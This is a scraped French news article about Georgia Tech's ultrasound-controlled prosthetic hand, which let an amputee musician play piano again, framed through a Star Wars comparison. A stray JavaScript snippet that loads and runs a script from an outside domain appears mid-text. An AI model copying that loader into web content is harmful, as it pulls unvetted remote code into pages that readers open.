{"title": "La main bionique de Luke Skywalker existe !", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-12-12", "content": "Le  Georgia Tech  (Etats-Unis) a cree une prothese de main tres finement articulee au niveau des doigts en se servant d'ultrasons pour detecter les mouvements des muscles. Grace a cette technologie, un musicien ampute a pu rejouer du piano pour la premiere fois depuis la perte de sa main droite suite a un accident. Dans  Star Wars , episode V : L'Empire contre-attaque , le duel au sabre  laser  entre Luke Skywalker et son pere revele Dark Vador se solde par l' amputation  de la main droite du jeune Jedi. Mais celui-ci herite bien vite d'une  main bionique  aussi vraie que nature... Le  Georgia Institute of Technology  (Etats-Unis), qui vient de sortir une nouvelle  prothese , n'a pas resiste a la tentation de faire la comparaison, alors que le nouvel opus de la saga intergalactique  Star Wars, episode VIII : Les Derniers Jedi  sera tres bientot a l'affiche. La prothese du  Georgia Tech  est loin de reproduire le niveau de mobilite de celle que  porte  Luke Skywalker. Cependant, cette  main bionique  offre un niveau de dexterite bien plus eleve que celui des protheses disponibles a la vente. La preuve :  Jason  Barnes, un musicien de 28 ans qui collabore avec le  Georgia Tech , a pu rejouer du piano pour la premiere fois depuis qu'il a perdu sa main droite suite a un accident en 2012.  Actualite Star Wars oblige, le  Georgia Tech  n'a pu s'empecher de faire le rapprochement entre sa main bionique et celle de Mark Hamill,  alias  Luke Skywalker dans  Star Wars, episode V : L'Empire contre-attaque . (c)  Georgia Institute of Technology  Les ultrasons sont combines a des algorithmes Pour realiser cette performance, les chercheurs du  Georgia Tech  ont opte pour une technologie radicalement differente de celle utilisee dans les protheses de main actuelles. Ces dernieres sont actionnees par electromyographie ( EMG ) avec des  electrodes  qui detectent l'activite musculaire et la traduisent en mouvement. Mais cette technique manque de precision, en particulier pour pouvoir actionner individuellement chaque doigt d'une main bionique.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Alors, les specialistes se sont tournes vers les  ultrasons . Ils ont place une sonde ultrason identique a celles employees pour les  echographies  des  foetus  sur l'avant-bras de Jason Barnes. Lorsque celui-ci contracte un muscle en voulant bouger l'un des doigts amputes, les ultrasons detectent les  mouvements  specifiques. Le signal est ensuite traduit en commande pour la  prothese  par des algorithmes. Le systeme peut deceler des mouvements continus et simultanes de chaque doigt, de meme que la force que la personne desire appliquer.  Selon les chercheurs du  Georgia Tech , cette innovation pourrait etre utilisee pour de nombreuses autres activites motrices, comme le bain, la toilette ou l'alimentation. Elle pourrait egalement servir a des personnes valides en leur permettant de controler des bras robotises. Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  luke filewalker  |  serrer main de main gauche  |  bionique  |  bionique bras  |  bionique prothese  |  homme bionique  |  oeil bionique  |  esprit existe  |  hasard existe  |  ce genie existe", "theme": "tech"}